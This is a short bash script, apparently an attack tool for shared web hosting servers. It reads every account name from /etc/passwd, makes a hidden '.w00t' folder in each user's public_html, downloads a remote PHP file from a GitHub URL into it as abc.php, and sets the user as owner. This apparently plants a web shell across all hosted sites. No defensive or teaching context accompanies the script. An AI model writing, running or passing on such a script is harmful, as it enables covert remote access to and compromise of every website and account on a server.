#!/bin/bash


awk -F: '{ print $1}' /etc/passwd >> am.txt


while read line; do

mkdir /home/$line/public_html/.w00t

curl https://raw.githubusercontent.com/0x00fy/0x00fy/main/sts.php -o /home/$line/public_html/.w00t/abc.php

chown $line /home/$line/public_html/.w00t/abc.php
chgrp $line /home/$line/public_html/.w00t/abc.php


done < am.txt
